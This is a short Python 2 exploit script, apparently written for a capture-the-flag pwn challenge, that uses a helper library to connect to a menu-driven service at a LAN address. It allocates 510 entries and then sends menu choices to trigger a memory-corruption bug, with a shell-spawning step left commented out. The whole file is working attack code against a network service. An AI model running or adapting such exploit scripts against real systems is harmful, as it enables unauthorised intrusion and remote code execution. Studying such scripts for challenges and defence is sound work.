#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.128','port':8080}

#==========
def attack(cmn):
    cmn.read_until('name: ')
    cmn.sendln('hoge')

    for i in range(510):
        print i+1,
        create(cmn, 'aaaaaaaa', 'bbbbbbbb')

    cmn.read_until('> ')
    cmn.sendln('4')

    cmn.read_until('> ')
    cmn.sendln('6')


def create(cmn, name, desc):
    cmn.read_until('> ')
    cmn.sendln('1')
    
    cmn.read_until('size: ')
    cmn.sendln(str(len(name)+1))
    cmn.read_until('(Max 32 chars): ')
    cmn.sendln(name)
    
    cmn.read_until('size: ')
    cmn.sendln(str(len(desc)+1))
    cmn.sendln(desc)
    
#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='RAW')
    attack(cmn)
    """
    sh = Shell(cmn)
    sh.select()
    del(sh)
    """
    
    del(cmn)
    
#==========
